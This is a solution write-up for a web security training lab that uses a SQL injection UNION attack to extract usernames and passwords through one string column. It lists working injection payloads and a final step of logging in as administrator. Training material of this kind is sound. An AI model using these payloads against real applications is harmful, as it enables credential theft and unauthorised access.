## SQL injection UNION attack, retrieving multiple values in a single column

**Category:** sqli
**Difficulty:** Easy

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

### Solution Steps
1. Identify the injection point in the category parameter
2. Determine number of columns: `'+UNION+SELECT+NULL,NULL--` (2 columns)
3. Test which column accepts strings: `'+UNION+SELECT+NULL,'abc'--`
4. Only the second column accepts strings - first column is non-string type
5. Need to extract both username AND password through single string column
6. Use string concatenation to combine values with a separator:
7. `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
8. The || operator concatenates strings in most databases
9. Results display as: `administrator~s3cr3tpassw0rd`
10. Parse the output to separate username and password
11. Login as administrator

### Key Payloads
- `users`
- `username`
- `password`
- `administrator`
- `category`
- `'+UNION+SELECT+NULL,NULL--`
- `'+UNION+SELECT+NULL,'abc'--`
- `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
- `CONCAT(username,':',password)` (MySQL alternative)

### Indicators of Success
- UNION SELECT with NULL works
- Second column accepts string injection
- Concatenated values visible in response
- Username~password pairs extracted
- Administrator login successful

---
*Source: PortSwigger Web Security Academy*
